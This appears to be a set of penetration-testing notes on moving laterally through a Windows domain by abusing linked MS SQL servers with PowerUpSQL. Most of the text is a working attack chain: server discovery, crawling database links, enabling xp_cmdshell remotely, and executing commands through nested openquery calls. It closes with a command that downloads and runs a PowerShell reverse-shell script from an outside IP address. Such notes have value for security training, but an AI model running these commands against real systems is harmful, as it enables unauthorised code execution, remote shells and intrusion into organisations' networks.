*MS SQL servers are generally deployed in plenty in a Windows domain.

*SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.

*For MSSQL and PowerShell hackery, let's use PowerUpSQL
http://github.com/NetSPI/PowerUpSQL

-Discovery (SPN Scanning)

Get-SQLInstanceDomain

-Check Accessibility

Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

-Gather information

Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

*A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.

*In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.

*Database links work even across forest trusts.

-Searching Database Links
	+Look for links to remote servers

Get-SQLServerLink -Instance dcorp-mssql (output of "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose") -Verbose

or

select * from master..sysservers (in heidiSQL.exe)

-Enumerating Database Links - Manually
	*Openquery() function can be used to run queries on a linked database

select * from openquery("domain-sql1",'select * from master..sysservers')

-Enumerating Database Links

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

it shows the links! domain-sql1 -> domain-computername -> eu-sql.eu.bigdomain.local

-Executing Commands

*on the target server, either xp_cmdshell should be already enabled; or if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure') AT "eu-sql"

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" (can pipe to | ft)

or

select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql",""select @@version as version;exec master..xp_cmdshell "powershell whoami)"")")')


-Rev

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell -c iex(New-Object Net.WebClient).DownloadString(''http://172.16.100.71/Invoke-PowerShellTcp.ps1'')"'
